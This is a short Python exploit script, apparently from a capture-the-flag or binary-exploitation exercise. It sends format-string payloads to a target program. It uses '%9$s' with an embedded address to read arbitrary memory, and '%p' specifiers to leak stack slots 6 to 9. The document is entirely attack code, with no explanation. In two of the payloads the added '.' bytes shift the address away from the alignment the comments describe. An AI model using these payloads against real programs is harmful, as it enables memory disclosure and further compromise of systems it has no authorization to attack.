from mirage import send_payload

# slot6 = bytes0-7, slot7=bytes8-15, slot8=bytes16-23, slot9=bytes24-31
payload = b"%9$s" + b"A"*20 + b"\x40\x51\x4b\x00\x00\x00\x00\x00" + b"\n"
assert len(payload) - 1 == 32  # 4+20+8
b, r = send_payload(payload)
print("test slot9 = addr:", r)

# sanity: use %9$p instead of %9$s to see the raw value landing in slot9
payload2 = b"%9$p." + b"A"*20 + b"\x40\x51\x4b\x00\x00\x00\x00\x00" + b"\n"
b2, r2 = send_payload(payload2)
print("test slot9 raw (%p):", r2)

# also check slot6,7,8 with %p to verify alignment matches our A-padding/text
payload3 = b"%6$p.%7$p.%8$p.%9$p." + b"A"*20 + b"\x40\x51\x4b\x00\x00\x00\x00\x00" + b"\n"
b3, r3 = send_payload(payload3)
print("test slots 6-9 raw:", r3)
